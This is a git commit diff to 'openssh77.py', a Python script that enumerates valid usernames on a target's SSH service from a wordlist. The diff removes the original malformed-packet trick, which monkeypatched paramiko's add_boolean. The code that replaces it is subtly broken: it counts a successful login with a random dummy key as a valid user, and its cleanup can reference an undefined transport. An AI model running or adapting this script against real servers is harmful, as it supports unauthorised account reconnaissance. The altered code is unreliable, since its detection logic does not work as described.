ac983136108cd1981a1a232e9e88ae070bfd4624
L3V1ATAN <L3V1ATAN@protonmail.com>
2024-08-08 19:18:08 -0500

    Update openssh77.py

--- openssh77.py
+++ openssh77.py
@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 
 import argparse
@@ -10,25 +11,6 @@ import os
 class InvalidUsername(Exception):
     pass
 
-# malicious function to malform packet
-def add_boolean(*args, **kwargs):
-    pass
-
-# Replace the packet handling behavior using the available API
-def service_accept(client_handler, *args, **kwargs):
-    old_add_boolean = paramiko.message.Message.add_boolean
-    paramiko.message.Message.add_boolean = add_boolean
-    result = client_handler(*args, **kwargs)
-    paramiko.message.Message.add_boolean = old_add_boolean
-    return result
-
-# call when username was invalid
-def invalid_username(*args, **kwargs):
-    raise InvalidUsername()
-
-# Here, we will replace the handler by using a known method or through correct hooks
-# Note: This requires knowledge of the specific API changes in paramiko
-
 # Print valid users found out so far
 def print_result(valid_users):
     if valid_users:
@@ -38,35 +20,46 @@ def print_result(valid_users):
     else:
         print("No valid user detected.")
 
-# perform authentication with malicious packet and username
-def check_user(username):
+# Perform authentication with a public key and username
+def check_user(username, target, port):
     try:
+        # Create a socket connection
         sock = socket.socket()
-        sock.connect((args.target, int(args.port)))
+        sock.connect((target, port))
+        
+        # Set up the SSH transport
         transport = paramiko.Transport(sock)
-        transport.start_client(timeout=0.5)
-
-    except paramiko.ssh_exception.SSHException:
-        print('[!] Failed to negotiate SSH transport')
+        transport.start_client(timeout=10)
+        
+        # Use a dummy public key for authentication
+        key = paramiko.RSAKey.generate(2048)
+        try:
+            transport.auth_publickey(username, key)
+            # If authentication succeeds, we consider the user valid
+            if transport.is_active():
+                print(f"[+] {username} is a valid username")
+                return True
+        except paramiko.ssh_exception.AuthenticationException:
+            print(f"[-] {username} is an invalid username")
+            return False
+    except paramiko.ssh_exception.SSHException as e:
+        print(f'[!] Failed to negotiate SSH transport: {e}')
         sys.exit(2)
+    except Exception as e:
+        print(f"[-] Error occurred: {e}")
+    finally:
+        transport.close()
+        sock.close()
+    return False
 
-    try:
-        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
-    except paramiko.ssh_exception.AuthenticationException:
-        print("[+] {} is a valid username".format(username))
-        return True
-    except:
-        print("[-] {} is an invalid username".format(username))
-        return False
-
-def check_userlist(wordlist_path):
+def check_userlist(wordlist_path, target, port):
     if os.path.isfile(wordlist_path):
         valid_users = []
         with open(wordlist_path) as f:
             for line in f:
-                username = line.rstrip()
+                username = line.strip()
                 try:
-                    if check_user(username):
+                    if check_user(username, target, port):
                         valid_users.append(username)
                 except KeyboardInterrupt:
                     print("Enumeration aborted by user!")
@@ -74,29 +67,33 @@ def check_userlist(wordlist_path):
 
         print_result(valid_users)
     else:
-        print("[-] {} is an invalid wordlist file".format(wordlist_path))
+        print(f"[-] {wordlist_path} is an invalid wordlist file")
         sys.exit(2)
 
-# remove paramiko logging
+# Remove paramiko logging
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
-parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
-parser.add_argument('target', help="IP address of the target system")
-parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
-parser.add_argument('-u', '--user', dest='username', help="Username to check for validity.")
-parser.add_argument('-w', '--wordlist', dest='wordlist', help="username wordlist")
+def main():
+    parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
+    parser.add_argument('target', help="IP address of the target system")
+    parser.add_argument('-p', '--port', default=22, type=int, help="Set port of SSH service")
+    parser.add_argument('-u', '--user', dest='username', help="Username to check for validity.")
+    parser.add_argument('-w', '--wordlist', dest='wordlist', help="Username wordlist")
 
-if len(sys.argv) == 1:
-    parser.print_help()
-    sys.exit(1)
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
 
-args = parser.parse_args()
+    args = parser.parse_args()
 
-if args.wordlist:
-    check_userlist(args.wordlist)
-elif args.username:
-    check_user(args.username)
-else:
-    print("[-] Username or wordlist must be specified!\n")
-    parser.print_help()
-    sys.exit(1)
+    if args.wordlist:
+        check_userlist(args.wordlist, args.target, args.port)
+    elif args.username:
+        check_user(args.username, args.target, args.port)
+    else:
+        print("[-] Username or wordlist must be specified!\n")
+        parser.print_help()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
